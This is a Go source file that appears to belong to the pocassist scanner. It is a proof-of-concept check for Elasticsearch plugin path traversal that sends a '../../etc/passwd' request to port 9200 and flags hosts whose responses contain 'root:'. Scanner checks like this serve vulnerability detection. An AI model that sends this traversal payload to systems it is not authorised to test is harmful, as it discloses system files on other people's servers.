package scripts

import (
	"bytes"
	"fmt"
	"github.com/jweny/pocassist/pkg/util"
)

// ES路径遍历
func ElasticSearchPathTraversal(args *ScriptScanArgs) (*util.ScanResult, error) {
	// es默认插件列表
	var elasticSearchPluginList = []string{"test", "kopf", "HQ", "marvel", "bigdesk", "head"}
	// es访问正常状态
	var elasticSearchStatusOk = []byte("HTTP/1.0 200 OK")

	addr := args.Host + ":9200"
	for _, plugin := range elasticSearchPluginList {
		payload := []byte(fmt.Sprintf("GET /_plugin/%v/ HTTP/1.0\nHost: %v\n\n", plugin, args.Host))
		resp, err := util.TcpSend(addr, payload)
		if err != nil{
			continue
		}
		// 不管是否出错
		if bytes.Contains(resp, elasticSearchStatusOk) {
			payload := fmt.Sprintf("GET /_plugin/%v/../../../../../../etc/passwd HTTP/1.0\nHost: %v\n\n", plugin, args.Host)
			resp, err := util.TcpSend(addr, []byte(payload))
			if err != nil {
				return nil, err
			}
			// 不管是否出错
			if bytes.Contains(resp, elasticSearchStatusOk) && bytes.Contains(resp, []byte("root:")) {
				return util.VulnerableTcpOrUdpResult(addr,"",[]string{payload},[]string{string(resp)}),nil
			}
			// 根据原脚本，第一个请求成功，不管第二个是否成功都直接结束
			return &util.InVulnerableResult, nil
		}
	}
	return &util.InVulnerableResult, nil
}

func init() {
	ScriptRegister("poc-go-elasticsearch-path-traversal", ElasticSearchPathTraversal)
}
